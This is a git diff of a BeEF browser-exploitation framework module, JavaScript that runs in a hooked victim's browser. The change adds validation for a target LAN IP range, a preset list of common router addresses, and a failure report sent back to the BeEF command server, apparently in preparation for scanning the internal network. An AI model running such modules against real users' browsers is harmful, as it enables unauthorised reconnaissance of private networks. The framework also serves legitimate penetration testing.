@@ -17,19 +17,8 @@ beef.execute(function() {
     ports = ports.split(',');
   }
 
-  // set target LAN IP addresses
-  if (ipRange != null){
-    // ipRange will be in the form of 192.168.0.1-192.168.0.254
-    // the fourth octet will be iterated.
-    // (only C class IP ranges are supported atm)
-    ipBounds   = ipRange.split('-');
-    lowerBound = ipBounds[0].split('.')[3];
-    upperBound = ipBounds[1].split('.')[3];
-    for (i=lowerBound;i<=upperBound;i++){
-      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
-      ips.push(ipToTest);
-    }
-  } else {
+  // set target IP addresses
+  if (ipRange == 'common') {
     // use default IPs
     ips = [
       '192.168.0.1',
@@ -49,6 +38,23 @@ beef.execute(function() {
       '192.168.10.1',
       '192.168.10.254'
     ];
+  } else {
+    // set target IP range
+    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+    if (range == null || range[1] == null) {
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied");
+      return;
+    }
+    // ipRange will be in the form of 192.168.0.1-192.168.0.254
+    // the fourth octet will be iterated.
+    // (only C class IP ranges are supported atm)
+    ipBounds   = ipRange.split('-');
+    lowerBound = ipBounds[0].split('.')[3];
+    upperBound = ipBounds[1].split('.')[3];
+    for (i=lowerBound;i<=upperBound;i++){
+      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
+      ips.push(ipToTest);
+    }
   }
 
   /* Signatures in the form of:
